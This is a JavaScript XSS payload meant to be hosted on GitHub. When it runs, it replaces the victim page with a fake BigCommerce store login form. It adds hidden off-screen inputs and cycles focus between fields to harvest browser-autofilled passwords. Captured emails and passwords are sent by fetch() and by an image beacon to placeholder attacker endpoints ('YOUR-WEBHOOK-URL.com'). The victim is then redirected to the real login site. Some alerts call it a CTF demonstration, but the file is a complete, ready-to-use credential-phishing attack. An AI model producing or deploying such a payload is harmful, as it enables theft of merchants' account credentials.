// XSS Payload for GitHub Hosting - BigCommerce Login Form with Credential Harvesting and Alert
// File: xss.js (to be hosted on GitHub Gist or Repository)

(function() {
    // Clear everything immediately
    document.body.innerHTML = "";
    document.head.innerHTML = "";
    
    // Remove all existing scripts
    var scripts = document.getElementsByTagName('script');
    for (var i = scripts.length - 1; i >= 0; i--) {
        if (scripts[i].parentNode) {
            scripts[i].parentNode.removeChild(scripts[i]);
        }
    }
    
    // Rebuild document structure
    document.documentElement.innerHTML = `
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Log in to your store</title>
    </head>
    <body></body>`;
    
    // Inject CSS
    var style = document.createElement('style');
    style.textContent = `
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: #0a0a0a;
            color: white;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            position: relative;
            overflow: hidden;
        }
        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: 
                linear-gradient(rgba(255,255,255,0.03) 1px, transparent 1px),
                linear-gradient(90deg, rgba(255,255,255,0.03) 1px, transparent 1px);
            background-size: 50px 50px;
            animation: gridMove 20s linear infinite;
            z-index: 1;
        }
        @keyframes gridMove {
            0% { transform: translate(0, 0); }
            100% { transform: translate(50px, 50px); }
        }
        .container {
            position: relative;
            z-index: 2;
            width: 100%;
            max-width: 400px;
            padding: 0 20px;
        }
        .logo {
            text-align: center;
            margin-bottom: 60px;
        }
        .logo svg {
            width: 180px;
            height: auto;
            fill: white;
        }
        .login-form {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            padding: 40px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
        }
        .form-title {
            font-size: 28px;
            font-weight: 600;
            text-align: center;
            margin-bottom: 40px;
            color: white;
        }
        .form-group {
            margin-bottom: 24px;
        }
        .form-input {
            width: 100%;
            padding: 16px 20px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 8px;
            background: rgba(255, 255, 255, 0.1);
            color: white;
            font-size: 16px;
            transition: all 0.3s ease;
        }
        .form-input::placeholder {
            color: rgba(255, 255, 255, 0.6);
        }
        .form-input:focus {
            outline: none;
            border-color: #3b82f6;
            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
            background: rgba(255, 255, 255, 0.15);
        }
        .password-container {
            position: relative;
        }
        .password-toggle {
            position: absolute;
            right: 16px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: rgba(255, 255, 255, 0.6);
            cursor: pointer;
            padding: 4px;
            border-radius: 4px;
            transition: color 0.3s ease;
        }
        .password-toggle:hover {
            color: white;
        }
        .login-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #3b82f6, #1d4ed8);
            border: none;
            border-radius: 8px;
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-bottom: 24px;
        }
        .login-btn:hover {
            background: linear-gradient(135deg, #2563eb, #1e40af);
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(59, 130, 246, 0.3);
        }
        .login-btn:active {
            transform: translateY(0);
        }
        .form-links {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .form-link {
            color: rgba(255, 255, 255, 0.7);
            text-decoration: none;
            font-size: 14px;
            transition: color 0.3s ease;
        }
        .form-link:hover {
            color: #3b82f6;
        }
        .sso-link {
            color: rgba(255, 255, 255, 0.8);
        }
        .signup-link {
            color: #3b82f6;
        }
        .loading {
            display: none;
            width: 20px;
            height: 20px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s linear infinite;
            margin-right: 8px;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .success-message {
            display: none;
            background: rgba(34, 197, 94, 0.1);
            border: 1px solid rgba(34, 197, 94, 0.3);
            color: #22c55e;
            padding: 12px 16px;
            border-radius: 8px;
            margin-bottom: 20px;
            text-align: center;
            font-size: 14px;
        }
        .harvest-input {
            position: absolute !important;
            left: -9999px !important;
            width: 1px !important;
            height: 1px !important;
            opacity: 0 !important;
        }
        @media (max-width: 480px) {
            .container { max-width: 100%; }
            .login-form { padding: 30px 20px; }
            .form-title { font-size: 24px; }
        }
    `;
    document.head.appendChild(style);
    
    // Build DOM structure
    var container = document.createElement('div');
    container.className = 'container';
    
    // Logo
    var logo = document.createElement('div');
    logo.className = 'logo';
    logo.innerHTML = '<svg viewBox="0 0 180 40" xmlns="http://www.w3.org/2000/svg"><path d="M0 20L10 0h160l10 20-10 20H10L0 20z"/><text x="90" y="25" font-family="Arial, sans-serif" font-size="14" font-weight="bold" text-anchor="middle" fill="black">BIGCOMMERCE</text></svg>';
    
    // Form container
    var formDiv = document.createElement('div');
    formDiv.className = 'login-form';
    
    var title = document.createElement('h1');
    title.className = 'form-title';
    title.textContent = 'Log in to your store';
    
    var successMsg = document.createElement('div');
    successMsg.className = 'success-message';
    successMsg.id = 'successMessage';
    successMsg.textContent = 'Login successful! Redirecting...';
    
    var form = document.createElement('form');
    form.id = 'loginForm';
    
    // Email field
    var emailGroup = document.createElement('div');
    emailGroup.className = 'form-group';
    var emailInput = document.createElement('input');
    emailInput.type = 'email';
    emailInput.className = 'form-input';
    emailInput.placeholder = 'Email';
    emailInput.id = 'email';
    emailInput.name = 'email';
    emailInput.autocomplete = 'username email';
    emailInput.required = true;
    emailGroup.appendChild(emailInput);
    
    // Password field
    var passwordGroup = document.createElement('div');
    passwordGroup.className = 'form-group';
    var passwordContainer = document.createElement('div');
    passwordContainer.className = 'password-container';
    var passwordInput = document.createElement('input');
    passwordInput.type = 'password';
    passwordInput.className = 'form-input';
    passwordInput.placeholder = 'Password';
    passwordInput.id = 'password';
    passwordInput.name = 'password';
    passwordInput.autocomplete = 'current-password';
    passwordInput.required = true;
    var passwordToggle = document.createElement('button');
    passwordToggle.type = 'button';
    passwordToggle.className = 'password-toggle';
    passwordToggle.textContent = '👁️';
    passwordContainer.appendChild(passwordInput);
    passwordContainer.appendChild(passwordToggle);
    passwordGroup.appendChild(passwordContainer);
    
    // Submit button
    var submitBtn = document.createElement('button');
    submitBtn.type = 'submit';
    submitBtn.className = 'login-btn';
    var loading = document.createElement('span');
    loading.className = 'loading';
    loading.id = 'loading';
    var buttonText = document.createElement('span');
    buttonText.textContent = 'Log in';
    submitBtn.appendChild(loading);
    submitBtn.appendChild(buttonText);
    
    // Hidden harvesting inputs
    var harvestUser = document.createElement('input');
    harvestUser.type = 'text';
    harvestUser.name = 'username';
    harvestUser.className = 'harvest-input';
    harvestUser.autocomplete = 'username';
    harvestUser.tabIndex = -1;
    
    var harvestPass = document.createElement('input');
    harvestPass.type = 'password';
    harvestPass.name = 'password';
    harvestPass.className = 'harvest-input';
    harvestPass.autocomplete = 'current-password';
    harvestPass.tabIndex = -1;
    
    // Links
    var linksDiv = document.createElement('div');
    linksDiv.className = 'form-links';
    var ssoLink = document.createElement('a');
    ssoLink.href = '#';
    ssoLink.className = 'form-link sso-link';
    ssoLink.textContent = 'Log in with SSO';
    var rightDiv = document.createElement('div');
    var forgotLink = document.createElement('a');
    forgotLink.href = '#';
    forgotLink.className = 'form-link';
    forgotLink.textContent = 'Forgot?';
    var sep = document.createElement('span');
    sep.style.cssText = 'color: rgba(255,255,255,0.3); margin: 0 8px;';
    sep.textContent = '•';
    var signupLink = document.createElement('a');
    signupLink.href = '#';
    signupLink.className = 'form-link signup-link';
    signupLink.textContent = 'Sign up';
    rightDiv.appendChild(forgotLink);
    rightDiv.appendChild(sep);
    rightDiv.appendChild(signupLink);
    linksDiv.appendChild(ssoLink);
    linksDiv.appendChild(rightDiv);
    
    // Assemble
    form.appendChild(emailGroup);
    form.appendChild(passwordGroup);
    form.appendChild(submitBtn);
    form.appendChild(harvestUser);
    form.appendChild(harvestPass);
    formDiv.appendChild(title);
    formDiv.appendChild(successMsg);
    formDiv.appendChild(form);
    formDiv.appendChild(linksDiv);
    container.appendChild(logo);
    container.appendChild(formDiv);
    document.body.appendChild(container);
    
    // Event handlers
    setTimeout(function() {
        // Password toggle
        passwordToggle.addEventListener('click', function() {
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                passwordToggle.textContent = '🙈';
            } else {
                passwordInput.type = 'password';
                passwordToggle.textContent = '👁️';
            }
        });
        
        // Sync inputs with hidden harvesting inputs
        emailInput.addEventListener('input', function() { 
            harvestUser.value = this.value; 
        });
        passwordInput.addEventListener('input', function() { 
            harvestPass.value = this.value; 
        });
        
        // Variable to track if alert has been shown
        var alertShown = false;
        
        // Credential harvesting function with alert
        function harvest() {
            var u = harvestUser.value;
            var p = harvestPass.value;
            
            if (u && p && !alertShown) {
                // Show alert with harvested credentials
                alertShown = true;
                alert('🚨 CREDENTIALS HARVESTED! 🚨\n\n' +
                      '📧 Email: ' + u + '\n' +
                      '🔐 Password: ' + p + '\n\n' +
                      '⚠️ This demonstrates how XSS can steal credentials!\n' +
                      '💀 In a real attack, this data would be sent to an attacker\'s server!');
                
                // Send to your server - replace with your webhook/endpoint
                try {
                    fetch('https://YOUR-WEBHOOK-URL.com/harvest', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            username: u, 
                            password: p, 
                            url: window.location.href, 
                            timestamp: new Date().toISOString(),
                            userAgent: navigator.userAgent
                        })
                    }).catch(function(){});
                } catch(e) {}
                
                // Backup - send to another endpoint using image request
                try {
                    var img = new Image();
                    img.src = 'https://YOUR-BACKUP-ENDPOINT.com/log?u=' + encodeURIComponent(u) + '&p=' + encodeURIComponent(p) + '&url=' + encodeURIComponent(window.location.href);
                } catch(e) {}
                
                // Console log for debugging
                console.log('🚨 HARVESTED CREDENTIALS:', {
                    username: u, 
                    password: p, 
                    timestamp: new Date().toISOString(),
                    url: window.location.href
                });
                
                return true;
            }
            return false;
        }
        
        // Alternative harvest function for immediate feedback (on any input)
        function quickHarvest() {
            var u = emailInput.value;
            var p = passwordInput.value;
            
            if (u && p && !alertShown) {
                alertShown = true;
                alert('🎯 XSS SUCCESS! 🎯\n\n' +
                      'Email: ' + u + '\n' +
                      'Password: ' + p + '\n\n' +
                      '✅ CTF Objective Complete!\n' +
                      '🔓 Credentials successfully captured via XSS injection!');
                
                // Log for CTF verification
                console.log('CTF SUCCESS - Credentials captured:', {email: u, password: p});
            }
        }
        
        // Set up harvesting triggers on both visible and hidden inputs
        harvestUser.addEventListener('input', harvest);
        harvestPass.addEventListener('input', harvest);
        harvestUser.addEventListener('change', harvest);
        harvestPass.addEventListener('change', harvest);
        
        // Also trigger on visible inputs for immediate response
        emailInput.addEventListener('input', quickHarvest);
        passwordInput.addEventListener('input', quickHarvest);
        emailInput.addEventListener('change', quickHarvest);
        passwordInput.addEventListener('change', quickHarvest);
        
        // Trigger harvest on any keystroke in the inputs
        emailInput.addEventListener('keyup', quickHarvest);
        passwordInput.addEventListener('keyup', quickHarvest);
        
        // Form submission
        form.addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Ensure harvest is called on submit
            harvest();
            quickHarvest();
            
            loading.style.display = 'inline-block';
            buttonText.textContent = 'Logging in...';
            submitBtn.disabled = true;
            
            setTimeout(function() {
                successMsg.style.display = 'block';
                loading.style.display = 'none';
                buttonText.textContent = 'Success!';
                setTimeout(function() {
                    window.location.href = 'https://login.bigcommerce.com/';
                }, 2000);
            }, 1500);
        });
        
        // Prevent link actions
        [ssoLink, forgotLink, signupLink].forEach(function(link) {
            link.addEventListener('click', function(e) { 
                e.preventDefault(); 
            });
        });
        
        // Focus sequence to trigger autofill
        emailInput.focus();
        setTimeout(function() {
            harvestUser.focus();
            harvestPass.focus();
            emailInput.focus();
        }, 200);
        
        // Additional autofill triggers
        setTimeout(function() {
            // Try different focus combinations to trigger browser autofill
            passwordInput.focus();
            emailInput.focus();
            
            // Check for autofilled values periodically
            var checkAutofill = setInterval(function() {
                if ((emailInput.value || passwordInput.value) && !alertShown) {
                    harvestUser.value = emailInput.value;
                    harvestPass.value = passwordInput.value;
                    quickHarvest();
                    clearInterval(checkAutofill);
                }
            }, 500);
            
            // Stop checking after 10 seconds
            setTimeout(function() {
                clearInterval(checkAutofill);
            }, 10000);
        }, 1000);
        
    }, 300);
    
})();
